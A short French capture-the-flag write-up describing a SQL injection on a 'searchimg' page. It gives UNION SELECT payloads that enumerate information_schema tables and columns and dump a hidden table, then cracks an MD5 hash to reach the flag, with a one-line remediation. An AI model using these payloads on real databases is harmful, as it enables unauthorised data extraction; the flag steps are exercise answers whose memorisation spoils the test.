<h1>Faille</h1>

Sur la page `searchimg`, il y a une SQL Injection.
Au début, j'ai affiché tous les users de la table avec `1 or 1` ce qui me permet de constater qu’il y a une SQL Injection.

`1 or 1`<br>
```1 UNION SELECT table_name, table_type FROM information_schema.tables```

- Rechercher les tableau de type "BASE TABLE"
- db_default users guestbook `list_images` vote_dbs

```1 UNION SELECT table_name, table_schema FROM information_schema.tables```
- Donc table_name: Member_images, table_schema: list_images

```1 UNION SELECT table_name, column_name FROM information_schema.columns```
- id, url, title, comment

```1 or 1 UNION SELECT  title, comment FROM Member_images.list_images```

1928e8083cf461a51303633093573c46 -> Decrypt with md5 -> albatroz -> hash with sha256 pour trouver le flag le flag

<h1>Éviter cette faille</h1>

Proteger les requetes SQL.

<h1>Ressources</h1>

Information_schema: https://mariadb.com/kb/en/information-schema-columns-table/